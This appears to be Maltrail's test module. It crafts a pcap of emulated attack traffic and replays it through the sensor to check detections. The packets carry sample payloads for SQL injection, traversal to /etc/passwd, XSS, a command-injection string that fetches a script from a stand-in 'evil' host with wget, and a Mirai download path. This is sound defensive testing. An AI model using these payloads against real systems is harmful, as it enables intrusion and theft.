#!/usr/bin/env python

"""
Copyright (c) 2014-2026 Maltrail developers (https://github.com/stamparm/maltrail/)
See the file 'LICENSE' for copying permission
"""


import datetime
import doctest
import os
import re
import shutil
import socket
import struct
import subprocess
import sys
import tempfile

from core.settings import ROOT_DIR

# directories that hold data / non-source files and must not be touched by the smoke test
# ("misc" is no longer in the repository, but operators keep local scratch scripts there)
SKIP_DIRS = ("__pycache__", ".git", ".github", "docker", "html", "misc")

# packages whose modules carry doctests / pure logic worth importing and exercising
DOCTEST_PACKAGES = ("core",)

# root-level scripts also swept for doctests ("sensor" is retained for old checkouts; the sensor is Rust now)
DOCTEST_SCRIPTS = ("sensor", "server")

def _iter_py_files():
    for root, dirs, files in os.walk(ROOT_DIR):
        dirs[:] = [_ for _ in dirs if _ not in SKIP_DIRS]
        for filename in files:
            if filename.endswith(".py"):
                yield os.path.join(root, filename)

def _doctest_modules():
    for path in _iter_py_files():
        rel = os.path.relpath(path, ROOT_DIR)
        if os.path.basename(path) == "__init__.py":
            continue
        parts = rel.split(os.sep)
        if len(parts) == 1:
            if parts[0][:-len(".py")] not in DOCTEST_SCRIPTS:
                continue
        elif parts[0] not in DOCTEST_PACKAGES:
            continue
        yield rel[:-len(".py")].replace(os.sep, '.')

def smoke_test():
    """
    Runs basic smoke testing of the program: compiles every source file (syntax check on the
    running interpreter) and runs the doctests embedded in the core modules
    """

    retval = True

    # 1) every source file must compile on the running Python (catches Py2/Py3 syntax breakage everywhere, incl. feeds).
    #
    # The builtin compile(), not py_compile: py_compile WRITES the .pyc next to the source and ignores
    # sys.dont_write_bytecode, so this needed a writable source tree. On a read-only /opt/maltrail, or on
    # a tree where an earlier `sudo` run left a root-owned __pycache__, it raised PermissionError - and
    # that is exactly the sort of install where an operator reaches for a smoke test. compile() answers
    # the same question (does this parse on this interpreter) and writes nothing.
    compiled = 0
    for path in _iter_py_files():
        try:
            with open(path, "rb") as f:
                compile(f.read(), path, "exec", dont_inherit=True)   # bytes -> the PEP 263 coding cookie is honoured
            compiled += 1
        except (SyntaxError, ValueError) as ex:
            retval = False
            print("[x] smoke test failed compiling '%s' (%s)" % (path, ex))
        except EnvironmentError as ex:                               # unreadable file: report it, do not abort the sweep
            retval = False
            print("[x] smoke test could not read '%s' (%s)" % (path, ex))
    print("[i] smoke test: compiled %d source file(s)" % compiled)

    # 2) import the doctest-bearing modules and run their doctests
    failures = attempted = modules = 0
    for name in _doctest_modules():
        try:
            __import__(name)
            module = sys.modules[name]
        except Exception as ex:
            retval = False
            print("[x] smoke test failed importing module '%s' (%s)" % (name, ex))
            continue

        _failures, _attempted = doctest.testmod(module)
        failures += _failures
        attempted += _attempted
        modules += 1
        if _failures:
            retval = False

    print("[i] smoke test: ran %d doctest(s) across %d module(s)" % (attempted, modules))

    if retval:
        print("[i] smoke test final result: PASSED")
    else:
        print("[!] smoke test final result: FAILED")

    return retval

#
# --detect-test: replays a crafted pcap of emulated malicious traffic through the SHIPPED sensor (`-r file`) and
# asserts that each expected detection fires. Pure-stdlib pcap crafting (no scapy); an offline replay needs no root
# and no live interface. Trail-based detections are driven by a controlled fixture trails.csv; heuristic detections
# need no trails.
#

_SRC_MAC = b"\x02\x00\x00\x00\x00\x01"
_DST_MAC = b"\x02\x00\x00\x00\x00\x02"
_ATTACKER = "10.0.0.66"

def _eth(payload):
    return _DST_MAC + _SRC_MAC + b"\x08\x00" + payload  # EtherType IPv4

def _ipv4(src, dst, proto, payload):
    # NOTE: Maltrail does not validate L3/L4 checksums (it only struct.unpacks headers), so they are left 0
    total = 20 + len(payload)
    header = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total, 0x1234, 0, 64, proto, 0,
                         socket.inet_aton(src), socket.inet_aton(dst))
    return _eth(header + payload)

def _tcp(src, dst, sport, dport, flags, payload=b""):
    header = struct.pack("!HHIIBBHHH", sport, dport, 0, 0, 0x50, flags, 8192, 0, 0)
    return _ipv4(src, dst, 6, header + payload)

def _udp(src, dst, sport, dport, payload):
    header = struct.pack("!HHHH", sport, dport, 8 + len(payload), 0)
    return _ipv4(src, dst, 17, header + payload)

def _ipv6(src, dst, nxt, payload):
    """Minimal IPv6 header. Same reasoning as _ipv4: Maltrail unpacks headers, it does not verify."""
    header = struct.pack("!IHBB", 0x60000000, len(payload), nxt, 64)
    header += socket.inet_pton(socket.AF_INET6, src) + socket.inet_pton(socket.AF_INET6, dst)
    return _DST_MAC + _SRC_MAC + b"\x86\xdd" + header + payload


def _udp6(src, dst, sport, dport, payload):
    header = struct.pack("!HHHH", sport, dport, 8 + len(payload), 0)
    return _ipv6(src, dst, 17, header + payload)


def _icmp(src, dst, icmp_type=8):
    # echo request/reply; Maltrail reports ICMP against an IP trail
    return _ipv4(src, dst, 1, struct.pack("!BBHHH", icmp_type, 0, 0, 0x1337, 1))


def _dns_query(domain):
    question = b""
    for label in domain.split('.'):
        question += struct.pack("!B", len(label)) + label.encode("ascii")
    question += b"\x00" + struct.pack("!HH", 1, 1)              # QTYPE=A, QCLASS=IN
    return struct.pack("!HHHHHH", 0x1337, 0x0100, 1, 0, 0, 0) + question  # standard query, recursion desired

def _http_get(path, host, ua="curl/8.0"):
    return ("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n\r\n" % (path, host, ua)).encode("ascii")

def _http_raw(text):
    return text.encode("ascii")

def _http_response(headers, body=""):
    return ("%s\r\n\r\n%s" % (headers, body)).encode("ascii")

# fixture trails (trail, info, reference) referenced by the trail-based cases below
_DETECT_TRAILS = (
    ("evil-test-domain.com", "malware (test)", "(static)"),     # DNS query domain
    ("66.66.66.66", "malware (test)", "(static)"),              # SYN dst IP
    ("6.6.6.6:8443", "malware (test)", "(static)"),             # SYN dst IP:port (IPORT)
    ("7.7.7.7", "phishing (test)", "(static)"),                 # UDP (non-DNS) dst IP (info != malware / non-condensing)
    ("203.0.113.44", "malware (test)", "(static)"),             # HTTP Host header + dst IP in trails (TEST-NET-3, never whitelisted)
    ("/malicious-login.php", "malware (test)", "(static)"),     # HTTP URL path trail
    # The rest exist so every shape the DASHBOARD renders differently is actually produced. The
    # six above cover detection; these cover presentation, which had no fixture at all.
    ("ek-nuclear-test.com", "ek nuclear (malicious)", "(static)"),   # (malicious) icon
    ("custom-watch-test.com", "internal watchlist (custom)", "(custom)"),  # (custom) origin + mask_custom
    ("dead::beef", "apt test (malware)", "(static)"),                    # IPv6 endpoint rendering
    ("198.51.100.66", "bad reputation (suspicious)", "https://feed.example/list.txt"),  # feed-URL origin glyph, low severity (TEST-NET-2)
    ("192.0.2.66", "ransomware test (malware)", "(static)"),             # ICMP against an IP trail (TEST-NET-1)
)

_BASE_SEC = 1700000000
_BURST_SEC = _BASE_SEC + 100000  # well after the per-packet cases so the burst lands in one heuristics window

def _build_detect_traffic():
    """
    Returns (packets, checks): packets is a list of (ts_sec, raw_bytes); checks is a list of
    (description, expected_substrings). Per-packet detections each get their own second; the counting
    heuristics (port/web/infection scanning) are emitted as a same-second burst that a final
    higher-timestamp packet flushes (the sensor evaluates those only when its time window advances).
    """
    packets, checks, seq = [], [], [0]

    def add(description, raw, expected):
        packets.append((_BASE_SEC + seq[0], raw))
        seq[0] += 1
        checks.append((description, expected, False))

    # --- trail-based detections (driven by _DETECT_TRAILS) ---
    add("DNS query to known-bad domain -> TRAIL.DNS",
        _udp(_ATTACKER, "9.9.9.9", 50000, 53, _dns_query("evil-test-domain.com")),
        ("DNS", "evil-test-domain.com", "malware (test)"))
    add("TCP SYN to known-bad IP -> TRAIL.IP",
        _tcp(_ATTACKER, "66.66.66.66", 50001, 443, 0x02),
        ("IP 66.66.66.66", "malware (test)"))
    add("TCP SYN to known-bad IP:port -> TRAIL.IPORT",
        _tcp(_ATTACKER, "6.6.6.6", 50002, 8443, 0x02),
        ("6.6.6.6:8443",))
    add("UDP (non-DNS) to known-bad IP -> TRAIL.IP",
        _udp(_ATTACKER, "7.7.7.7", 40000, 40001, b"x"),
        ("7.7.7.7", "phishing (test)"))
    add("HTTP request to a known-bad URL path -> TRAIL.URL",
        _tcp(_ATTACKER, "203.0.113.10", 50003, 80, 0x18, _http_get("/malicious-login.php", "victimsite.example")),
        ("malicious-login.php", "malware (test)"))
    add("HTTP Host header to a known-bad dst IP -> TRAIL.IP",
        _tcp(_ATTACKER, "203.0.113.44", 50004, 80, 0x18, _http_get("/", "hostcheck.example")),
        ("203.0.113.44", "hostcheck.example"))

    # --- presentation shapes: everything the DASHBOARD renders differently ---
    # These are here so `--keep` produces a log in which every icon, colour, glyph and condensed
    # cell in the UI has at least one event behind it. Detection coverage above answers "does the
    # sensor see it"; these answer "can the server draw it".
    add("DNS query to a (malicious)-class domain -> the malicious icon",
        _udp(_ATTACKER, "9.9.9.9", 50010, 53, _dns_query("ek-nuclear-test.com")),
        ("ek-nuclear-test.com", "ek nuclear (malicious)"))
    add("DNS query to a (custom) trail -> custom origin, and the name masked for uid >= 1000",
        _udp(_ATTACKER, "9.9.9.9", 50011, 53, _dns_query("custom-watch-test.com")),
        ("custom-watch-test.com", "(custom)"))
    add("IPv6 endpoint against an IPv6 trail -> v6 address rendering",
        _udp6("dead::1", "dead::beef", 50012, 4444, b"beacon"),
        ("dead::beef", "apt test (malware)"))
    add("UDP to a feed-sourced trail -> the feed-URL origin glyph, low severity",
        _udp(_ATTACKER, "198.51.100.66", 50013, 41000, b"x"),
        ("198.51.100.66", "bad reputation (suspicious)"))
    add("ICMP against a known-bad IP -> ICMP proto rendering",
        _icmp(_ATTACKER, "192.0.2.66"),
        ("192.0.2.66", "ICMP"))

    # --- heuristic HTTP-request detections (no trails) ---
    add("HTTP SQL injection -> heuristic",
        _tcp(_ATTACKER, "203.0.113.11", 50005, 80, 0x18,
             _http_get("/items.php?id=1%20UNION%20ALL%20SELECT%20username,password%20FROM%20users", "sqli.example")),
        ("potential sql injection", "sqli.example"))
    add("HTTP directory traversal -> heuristic",
        _tcp(_ATTACKER, "203.0.113.12", 50006, 80, 0x18,
             _http_get("/download?file=../../../../etc/passwd", "trav.example")),
        ("potential directory traversal",))
    add("HTTP remote code execution -> heuristic",
        _tcp(_ATTACKER, "203.0.113.13", 50007, 80, 0x18,
             _http_get("/cgi?cmd=;cat%20/etc/passwd;wget%20http://evil/x.sh", "rce.example")),
        ("potential remote code execution",))
    add("HTTP XSS -> heuristic",
        _tcp(_ATTACKER, "203.0.113.14", 50008, 80, 0x18,
             _http_get("/search?q=<script>alert(1)</script>", "xss.example")),
        ("potential xss injection",))
    add("HTTP suspicious POST body -> heuristic",
        _tcp(_ATTACKER, "203.0.113.15", 50009, 80, 0x18,
             _http_raw("POST /submit HTTP/1.1\r\nHost: postsqli.example\r\n\r\nq=1 UNION ALL SELECT pwd FROM users")),
        ("postsqli.example", "potential sql injection"))
    add("HTTP direct-IP iot-malware download -> heuristic",
        _tcp(_ATTACKER, "198.51.100.99", 50010, 80, 0x18, _http_get("/mirai.x86", "198.51.100.99")),
        ("potential iot-malware download",))
    add("HTTP proxy probe -> heuristic",
        _tcp(_ATTACKER, "203.0.113.16", 50011, 80, 0x18, _http_get("http://proxycheck.example/", "203.0.113.16")),
        ("potential proxy probe",))
    add("HTTP direct suspicious-extension download -> heuristic",
        _tcp(_ATTACKER, "203.0.113.17", 50012, 80, 0x18, _http_get("/setup.exe", "dl.example")),
        ("direct .exe download",))
    add("HTTP missing Host header -> heuristic",
        _tcp(_ATTACKER, "203.0.113.18", 50013, 80, 0x18, _http_raw("GET /adminpanel HTTP/1.1\r\nUser-Agent: x\r\n\r\n")),
        ("missing host header",))

    # --- heuristic HTTP-response detections ---
    add("HTTP sinkhole response -> heuristic",
        _tcp("203.0.113.19", _ATTACKER, 80, 50014, 0x18, _http_response("HTTP/1.1 200 OK\r\nServer: sinkhole")),
        ("sinkhole response",))
    add("HTTP suspicious content-type response -> heuristic",
        _tcp("203.0.113.20", _ATTACKER, 80, 50015, 0x18,
             _http_response("HTTP/1.1 200 OK\r\nContent-Type: application/x-sh", "#!/bin/sh")),
        ("content type (suspicious)", "application/x-sh"))

    # --- counting heuristics: a same-second burst, then a higher-timestamp packet flushes the window ---
    for i in range(12):  # > PORT_SCANNING_THRESHOLD (10) distinct dst ports, one src -> one victim
        packets.append((_BURST_SEC, _tcp(_ATTACKER, "198.51.100.7", 51000 + i, 1000 + i, 0x02)))
    checks.append(("port scanning (>10 dst ports against one victim) -> heuristic", ("potential port scanning",), True))

    for i in range(12):  # > WEB_SCANNING_THRESHOLD (10) distinct first-path segments, one src -> one victim
        packets.append((_BURST_SEC, _tcp(_ATTACKER, "198.51.100.8", 52000 + i, 80, 0x18,
                                          _http_get("/scan%d/x" % i, "webscan.example"))))
    checks.append(("web scanning (>10 distinct paths against one victim) -> heuristic", ("potential web scanning",), True))

    for i in range(34):  # > INFECTION_SCANNING_THRESHOLD (32) distinct dst IPs on an infection port (445)
        packets.append((_BURST_SEC, _tcp(_ATTACKER, "198.51.100.%d" % (100 + i), 53000 + i, 445, 0x02)))
    checks.append(("infection scanning (>32 dst IPs on port 445) -> heuristic", ("potential infection",), True))

    # flush packet (higher timestamp) advances the heuristics window so the bursts above are evaluated
    packets.append((_BURST_SEC + 1, _udp(_ATTACKER, "203.0.113.250", 41000, 41001, b"flush")))

    return packets, checks

def _write_pcap(path, packets):
    with open(path, "wb") as f:
        f.write(struct.pack("<IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1))  # global header, linktype EN10MB
        for ts, packet in packets:
            f.write(struct.pack("<IIII", ts, 0, len(packet), len(packet)))
            f.write(packet)

def find_sensor():
    """
    The shipped sensor binary, or None.

    In install.sh's layout it is $PREFIX/sensor/target/release/maltrail-sensor with a symlink in
    /usr/local/bin; in a build tree it is under sensor/target/. PATH is consulted first so an
    operator's own build or package wins over a stale one in the tree.
    """

    for candidate in (shutil.which("maltrail-sensor"),
                      os.path.join(ROOT_DIR, "sensor", "target", "release", "maltrail-sensor"),
                      os.path.join(ROOT_DIR, "sensor", "target", "debug", "maltrail-sensor")):
        if candidate and os.path.isfile(candidate) and os.access(candidate, os.X_OK):
            return candidate

    return None


CORPUS_DIR = os.path.join(ROOT_DIR, "sensor", "tests", "corpus")


def _sensor_config(path, log_dir, trails_file):
    """A minimal offline-replay config. UPDATE_PERIOD is huge so the fixture trails are used as-is."""
    with open(path, "w") as f:
        f.write("\n".join((
            "MONITOR_INTERFACE any",
            "CAPTURE_BUFFER 10%",
            "USE_HEURISTICS true",
            "CHECK_MISSING_HOST true",
            "PROCESS_COUNT 1",
            "UPDATE_PERIOD 999999999",
            "USE_FEED_UPDATES false",
            "DISABLE_CHECK_SUDO true",
            "LOG_DIR %s" % log_dir,
            "TRAILS_FILE %s" % trails_file,
            "",
        )))
    return path


def _replay_corpus(binary, log_dir, work_dir):
    """Replay the parity corpus into `log_dir`. Returns the number of pcaps replayed.

    The corpus is 42 crafted captures with their own trail set, already asserted by
    `sensor/tests/replay.rs`. Replaying it here is what makes a kept LOG_DIR cover the detections
    the hand-built pcap above does not reach - JA3, periodic beaconing, DGA labels, DNS
    exhaustion, TLS/QUIC SNI, sinkhole and parked-site responses, and the encapsulations.
    """

    trails = os.path.join(CORPUS_DIR, "trails.csv")
    if not os.path.isfile(trails):
        return 0
    config = _sensor_config(os.path.join(work_dir, "corpus.conf"), log_dir, trails)
    replayed = 0
    for name in sorted(os.listdir(CORPUS_DIR)):
        if not name.endswith(".pcap"):
            continue
        process = subprocess.Popen([binary, "-r", os.path.join(CORPUS_DIR, name), "-c", config],
                                   stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        process.communicate()
        replayed += 1
    return replayed


def detect_test(keep=None, serve=False):
    """
    Replays a crafted pcap of emulated malicious traffic through the offline sensor and verifies
    that every expected detection fires (the core "does the sensor actually catch the bad traffic" gate).

    `keep` writes the resulting LOG_DIR (plus the trails and config used) somewhere durable and
    additionally replays the parity corpus into it, so the events can be served and LOOKED at -
    the sensor half answers "was it detected", the dashboard half answers "is it drawn correctly",
    and nothing but a populated log answers the second. `serve` then starts the web server on it.

    This drives the SHIPPED sensor. It used to run the retired Python sensor, which needs pcapy -
    not a dependency since the sensor became Rust - so on a healthy install the check that answers
    "is detection working?" printed "0/17 detection(s) fired ... FAILED". A gate that cries wolf on
    a working install is worse than no gate: it is the project's own failure mode, inverted.
    """

    binary = find_sensor()
    if binary is None:
        print("[!] detect test: no sensor binary found (looked on PATH and in sensor/target/)")
        print("[?] (hint: \"curl -sSL https://raw.githubusercontent.com/stamparm/maltrail/master/install.sh | sudo sh\", or \"cargo build --release --manifest-path sensor/Cargo.toml\")")
        print("[!] detect test final result: FAILED")
        return False

    print("[i] detect test: using sensor '%s'" % binary)
    packets, checks = _build_detect_traffic()

    if keep:
        tmp = os.path.abspath(os.path.expanduser(keep))
        if os.path.isdir(tmp):
            shutil.rmtree(tmp)          # a stale run must not be mistaken for this one
        os.makedirs(tmp)
    else:
        tmp = tempfile.mkdtemp(prefix="maltrail-detect-")
    try:
        log_dir = os.path.join(tmp, "logs")
        os.makedirs(log_dir)
        pcap_file = os.path.join(tmp, "traffic.pcap")
        trails_file = os.path.join(tmp, "trails.csv")
        config_file = os.path.join(tmp, "detect.conf")

        _write_pcap(pcap_file, packets)

        with open(trails_file, "w") as f:
            for trail, info, reference in _DETECT_TRAILS:
                f.write("%s,%s,%s\n" % (trail, info, reference))

        _sensor_config(config_file, log_dir, trails_file)

        cmd = [binary, "-r", pcap_file, "-c", config_file]
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        output = process.communicate()[0]

        events = ""
        for filename in os.listdir(log_dir):
            if filename.endswith(".log") and filename != "error.log":
                with open(os.path.join(log_dir, filename), "r") as f:
                    events += f.read()

        retval = True
        passed = 0
        for description, expected, timing_window in checks:
            # `timing_window` marks the three heuristics that need the pcap's own timestamps to flush their window.
            # They used to be skipped outright: offline Py3 substituted wall-clock time (a pcapy-ng workaround), so
            # they could only be asserted under Py2, which is gone. The Rust sensor honours pcap timestamps, so all
            # three fire and are asserted - the field is kept because it says WHY they are the fragile ones.
            if all(_ in events for _ in expected):
                passed += 1
            else:
                retval = False
                print("[x] detect test: FAILED  %s" % description)

        print("[i] detect test: %d/%d detection(s) fired" % (passed, len(checks)))

        if not retval:
            print("[!] sensor output was:\n%s" % (output.decode("utf8", "replace") if hasattr(output, "decode") else output))
        if keep:
            replayed = _replay_corpus(binary, log_dir, tmp)
            if replayed:
                print("[i] detect test: replayed %d corpus capture(s) into the same log" % replayed)
            moved = _shift_events_to_today(log_dir)
            if moved:
                print("[i] detect test: shifted %d event(s) so the newest day is today" % moved)
            _report_class_coverage(log_dir)
    finally:
        if not keep:
            shutil.rmtree(tmp, ignore_errors=True)

    if retval:
        print("[i] detect test final result: PASSED")
    else:
        print("[!] detect test final result: FAILED")

    if keep:
        served_conf = os.path.join(tmp, "server.conf")
        with open(served_conf, "w") as f:
            f.write("\n".join((
                "HTTP_ADDRESS 127.0.0.1",
                "HTTP_PORT 8338",
                "USE_SERVER_UPDATE_TRAILS false",
                "MONITOR_INTERFACE any",
                "CAPTURE_BUFFER 10MB",
                "UPDATE_PERIOD 999999999",
                "SENSOR_NAME detect-test",
                "DISABLE_CHECK_SUDO true",
                "LOG_DIR %s" % log_dir,
                "TRAILS_FILE %s" % trails_file,
                "",
            )))
        print("[i] events kept in '%s'" % log_dir)
        if serve:
            print("[i] serving them on http://127.0.0.1:8338/ (Ctrl-C to stop)")
            sys.stdout.flush()
            os.execv(sys.executable, [sys.executable, os.path.join(ROOT_DIR, "server.py"), "-c", served_conf])
        else:
            print("[?] look at them with: python3 server.py -c %s" % served_conf)

    return retval


# The dashboard draws these differently; a kept log is only useful if each one has an event
# behind it. Names are what `classOf()` / the origin glyph / the severity colours key on.
_UI_SHAPES = (
    ("info class (malware)", lambda e: '(malware)"' in e or "(malware)\"" in e),
    ("info class (malicious)", lambda e: "(malicious)" in e),
    ("info class (suspicious)", lambda e: "(suspicious)" in e),
    ("origin (static)", lambda e: "(static)" in e),
    ("origin (heuristic)", lambda e: "(heuristic)" in e),
    ("origin (custom)", lambda e: "(custom)" in e),
    ("origin feed URL", lambda e: "https://" in e or "http://" in e),
    ("trail type DNS", lambda e: " DNS " in e),
    ("trail type IP", lambda e: " IP " in e),
    ("trail type URL", lambda e: " URL " in e),
    ("trail type UA", lambda e: " UA " in e),
    ("trail type HTTP", lambda e: " HTTP " in e),
    ("proto ICMP", lambda e: " ICMP " in e),
    ("IPv6 endpoint", lambda e: "::" in e),
    ("condensed multi-value cell", lambda e: any("," in f for f in e.split(" ")[2:7])),
)


def _shift_events_to_today(log_dir):
    """Move the kept events forward so the newest lands today, keeping relative timing.

    Both the crafted pcap and the corpus replay use FIXED timestamps (_BASE_SEC is 2023-11-14), so
    the events land in a 2023 log while the dashboard opens on today - a populated LOG_DIR that
    looks completely empty. Shifting by whole days keeps every within-day time and every gap
    intact, so the heat map, the sparklines and the beaconing intervals still read correctly.
    """

    stamp = re.compile(r'\A"(\d{4}-\d{2}-\d{2}) ')
    events = []
    for filename in sorted(os.listdir(log_dir)):
        if not filename.endswith(".log") or filename == "error.log":
            continue
        path = os.path.join(log_dir, filename)
        with open(path) as f:
            for line in f:
                if line.strip():
                    events.append(line.rstrip("\n"))
        os.remove(path)

    days = sorted(set(m.group(1) for m in (stamp.match(_) for _ in events) if m))
    if not days:
        return 0

    newest = datetime.datetime.strptime(days[-1], "%Y-%m-%d").date()
    delta = datetime.date.today() - newest

    buckets = {}
    for line in events:
        m = stamp.match(line)
        if not m:
            continue
        moved = (datetime.datetime.strptime(m.group(1), "%Y-%m-%d").date() + delta).strftime("%Y-%m-%d")
        buckets.setdefault(moved, []).append('"%s %s' % (moved, line[len(m.group(0)):]))

    for day, lines in buckets.items():
        with open(os.path.join(log_dir, "%s.log" % day), "w") as f:
            f.write("\n".join(lines) + "\n")
    return len(events)


def _report_class_coverage(log_dir):
    """Print which dashboard shapes the kept log actually contains.

    Detection coverage says the sensor saw it; this says the SERVER has something to draw for
    every icon, glyph, colour and condensed cell the UI renders differently. A shape with no
    event behind it cannot be checked by looking at the dashboard.
    """

    lines = []
    for filename in sorted(os.listdir(log_dir)):
        if filename.endswith(".log") and filename != "error.log":
            with open(os.path.join(log_dir, filename)) as f:
                lines.extend(_ for _ in f.read().split("\n") if _.strip())

    print("[i] dashboard shape coverage (%d event(s)):" % len(lines))
    missing = []
    for label, present in _UI_SHAPES:
        hits = sum(1 for line in lines if present(line))
        print("      %-28s %s" % (label, ("%d event(s)" % hits) if hits else "MISSING"))
        if not hits:
            missing.append(label)
    if missing:
        print("[!] %d shape(s) with no event behind them: %s" % (len(missing), ", ".join(missing)))
